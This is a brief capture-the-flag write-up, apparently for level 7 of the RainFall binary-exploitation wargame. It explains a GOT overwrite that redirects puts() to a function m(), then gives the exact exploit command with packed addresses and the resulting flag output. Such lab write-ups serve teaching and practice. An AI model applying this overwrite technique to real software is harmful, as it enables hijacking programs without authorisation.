first parameter is address where to write:
    here we use `puts()' got address
second parameter is data to write:
    we overwrite `puts()' address with address of function `m()'

----

level7@RainFall:/tmp$ /home/user/level7/level7 $(python -c "print('A'*20+'\x08\x04\x99\x28'[::-1])") $(python -c "print('\x08\x04\x84\xf4'[::-1])")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1552713605
